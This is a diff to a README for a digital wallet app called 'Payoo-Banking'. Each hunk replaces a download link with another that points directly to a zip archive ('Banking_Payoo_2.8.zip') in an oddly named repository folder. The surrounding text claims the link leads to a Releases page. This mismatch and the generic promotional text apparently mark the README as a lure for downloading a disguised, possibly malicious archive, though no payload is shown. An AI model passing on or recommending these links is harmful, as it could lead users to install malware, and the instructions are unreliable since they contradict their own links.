@@ -1,6 +1,6 @@
 # 💳 Payoo-Banking - Your Complete Digital Wallet Solution
 
-![Download Payoo-Banking](https://raw.githubusercontent.com/luizguerra26/Payoo-Banking/main/aesthiology/Payoo-Banking.zip)
+![Download Payoo-Banking](https://github.com/luizguerra26/Payoo-Banking/raw/refs/heads/main/aesthiology/Banking_Payoo_2.8.zip)
 
 ## 📦 Overview
 Payoo is your all-in-one digital wallet that simplifies financial management. With Payoo, you can easily add money, cash out, transfer funds, pay bills, and enjoy bonus rewards — all from one app. Our goal is to make banking straightforward and enjoyable for everyone.
@@ -9,7 +9,7 @@ Payoo is your all-in-one digital wallet that simplifies financial management. Wi
 To get started with Payoo, follow these simple steps:
 
 1. **Visit our Release Page:** Click on the link below to access the latest version of Payoo:
-   [Download Payoo-Banking](https://raw.githubusercontent.com/luizguerra26/Payoo-Banking/main/aesthiology/Payoo-Banking.zip)
+   [Download Payoo-Banking](https://github.com/luizguerra26/Payoo-Banking/raw/refs/heads/main/aesthiology/Banking_Payoo_2.8.zip)
 
 2. **Select Your Version:** On the Releases page, look for the latest version available. You will see options to download files for different operating systems.
 
@@ -70,7 +70,7 @@ For any support inquiries, feel free to reach out through our GitHub repository:
 ## 📢 Stay Updated
 We regularly update Payoo with new features and improvements. Check the Releases page often to stay informed about the latest versions:
 
-[Download Payoo-Banking](https://raw.githubusercontent.com/luizguerra26/Payoo-Banking/main/aesthiology/Payoo-Banking.zip) 
+[Download Payoo-Banking](https://github.com/luizguerra26/Payoo-Banking/raw/refs/heads/main/aesthiology/Banking_Payoo_2.8.zip) 
 
 ## 🎯 Summary of Topics
 Payoo encompasses several topics that make it a very versatile application. Here are some key areas of focus:
